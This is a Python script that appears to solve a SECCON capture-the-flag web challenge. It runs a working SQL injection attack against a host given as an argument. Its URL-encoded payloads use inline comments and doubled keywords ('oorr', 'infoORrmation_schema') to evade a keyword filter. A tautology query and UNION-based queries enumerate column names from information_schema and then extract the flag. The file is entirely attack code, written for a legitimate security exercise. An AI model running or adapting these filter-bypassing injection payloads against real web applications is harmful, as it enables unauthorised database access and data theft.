import sys
import re
import requests


host = sys.argv[1]

params = [
    {'query':"q=%27%2F**%2Foorr%2F**%2F1%3D1%3B%23", 'pattern':'SECCON{[A-Za-z_]*'},
    {'query':"q=zz'union%2F**%2Fselect%2F**%2F*%2F**%2Ffrom(select%2F**%2Fnull)as%2F**%2Fa%2F**%2Fjoin(select%2F**%2Fcolumn_name%2F**%2Ffrom%2F**%2FinfoORrmation_schema.columns%2F**%2Fwhere%2F**%2Ftable_name%3D'flag')as%2F**%2Fb%2F**%2Fjoin(select%2F**%2Fnull)as%2F**%2Fc%23", 'pattern':'<dl><dt></dt><dd>([A-Za-z_]*)</dd></dl>'},
    {'query':"q=zz'union%2F**%2Fselect%2F**%2F*%2F**%2Ffrom(select%2F**%2Fnull)as%2F**%2Fa%2F**%2Fjoin(select%2F**%2F{{COLUMN_NAME}}%2F**%2Ffrom%2F**%2Fflag)as%2F**%2Fb%2F**%2Fjoin(select%2F**%2Fnull)as%2F**%2Fc%23", 'pattern':'<dl><dt></dt><dd>([A-Za-z_]*})</dd></dl>'}
    ]


def get_target_text(host, param, pattern):
    response = requests.get(host + '?' + param)
    match = re.findall(pattern, response.text)
    if (len(match) > 0):
        return match[0]
    return ''


flag_1 = get_target_text(host, params[0]['query'], params[0]['pattern'])
column = get_target_text(host, params[1]['query'], params[1]['pattern'])
flag_2 = get_target_text(host, params[2]['query'].replace('{{COLUMN_NAME}}', column), params[2]['pattern'])
print(flag_1 + flag_2)
